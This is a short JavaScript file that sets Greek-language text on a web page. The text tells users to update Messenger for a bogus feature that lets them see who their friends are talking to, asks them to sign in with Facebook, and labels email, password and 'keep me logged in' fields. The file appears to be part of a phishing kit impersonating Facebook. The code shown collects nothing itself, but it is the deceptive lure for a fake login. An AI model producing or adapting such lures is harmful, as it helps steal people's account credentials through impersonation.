var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Ενημερώστε το Messenger στην πιο πρόσφατη έκδοση για να απολαύσετε με τις νέες δυνατότητες, όπως να γνωρίζετε ποιος μιλάει με τους φίλους σας";
subMainParagraph.innerHTML ="Συνδεθείτε άμεσα με άτομα της ζωής σας. Συνδεθείτε με το Facebook για να ξεκινήσετε.";
updateButton.innerHTML ="ενημέρωση τώρα";
userInput.setAttribute("placeholder" , "Διεύθυνση email ή αριθμό τηλεφώνου");
passInput.setAttribute("placeholder" , "Κωδικός πρόσβασης");
logButton.setAttribute("value" , "Σύνδεση");
checkBox.innerHTML ="Κράτησε με συνδεδεμένο";
